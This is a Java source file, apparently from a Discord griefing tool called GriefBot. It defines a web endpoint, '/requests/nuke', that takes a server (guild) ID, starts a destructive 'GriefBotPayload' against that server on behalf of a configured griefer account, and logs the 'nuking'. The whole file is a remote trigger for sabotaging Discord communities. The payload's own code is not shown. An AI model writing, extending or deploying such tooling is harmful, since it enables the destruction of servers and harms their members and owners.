package de.corruptedbytes.webserver.webserverindexes.requests;

import java.io.IOException;
import com.sun.net.httpserver.HttpServer;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.logger.GriefBotLogger;
import de.corruptedbytes.logger.GriefBotLoggerLevel;
import de.corruptedbytes.payload.GriefBotPayload;
import de.corruptedbytes.webserver.WebServerIndex;
import de.corruptedbytes.webserver.WebServerUtil;
import net.dv8tion.jda.api.entities.Guild;

public class RequestNuke implements WebServerIndex {

	@Override
	public void index(HttpServer httpServer) throws IOException {
		httpServer.createContext("/requests/nuke", exchange -> {
			if (!exchange.getRequestMethod().equals("GET")) {
				exchange.close();
				return;
			}
			
			if (WebServerUtil.getQueryParam(exchange, "id") != null) {
				try {
					Guild guild = GriefBot.getInstance().getBotManager().getGuildById(WebServerUtil.getQueryParam(exchange, "id"));
					GriefBotPayload griefBotPayload = new GriefBotPayload(guild, GriefBot.getInstance().getBotManager().getUserById(GriefBot.getInstance().getGrieferUserID()));
					griefBotPayload.start();
					
					GriefBotLogger.log("[GriefBot/NukeRequest] Nuking: " + WebServerUtil.getQueryParam(exchange, "id"), GriefBotLoggerLevel.INFO);
					WebServerUtil.sendResponse(exchange, 200, ("OK").getBytes());
				} catch (Exception e) {
					GriefBotLogger.log("[GriefBot/NukeRequest] Nuking failed! (" + e.getMessage() + ")", GriefBotLoggerLevel.ERROR);
					WebServerUtil.sendResponse(exchange, 200, ("ERROR").getBytes());
				}
			}
		});
	}

}
